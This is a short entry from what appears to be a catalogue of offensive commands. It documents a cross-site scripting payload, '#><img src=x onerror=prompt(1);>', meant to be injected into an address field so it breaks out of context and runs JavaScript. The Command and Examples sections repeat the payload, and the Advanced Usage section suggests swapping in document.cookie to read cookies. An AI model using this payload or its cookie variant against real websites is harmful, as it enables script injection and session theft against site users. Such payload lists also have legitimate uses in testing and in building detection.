---
data: '#><img src=x onerror=prompt(1);>'
tags:
  - xss
  - payload
type: command
output: Alert box with '1'
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:14.495Z'
id: aecfbc7f-cca8-4469-a4d7-0ccf76d97bf8
verified: false
validated: true
submitted: true
---
# xss-payload-alert-injection

## Command

```html
#><img src=x onerror=prompt(1);>
```

## Description

This HTML snippet is injected into the address field to break out of context and execute JavaScript via an onerror event on a malformed img tag, popping an alert to confirm XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | Invalid 'x' to trigger onerror | Yes |
| onerror | JS code to execute (prompt(1)) | Yes |

## Examples

### Basic Usage

```html
#><img src=x onerror=prompt(1);>
```

### Advanced Usage

Adapt onerror for custom JS, e.g., onerror=alert(document.cookie)

## Expected Output

Alert dialog displaying '1' upon execution.

## Related

- [[commands/javascript-iframe-chaining-rush-theft]]
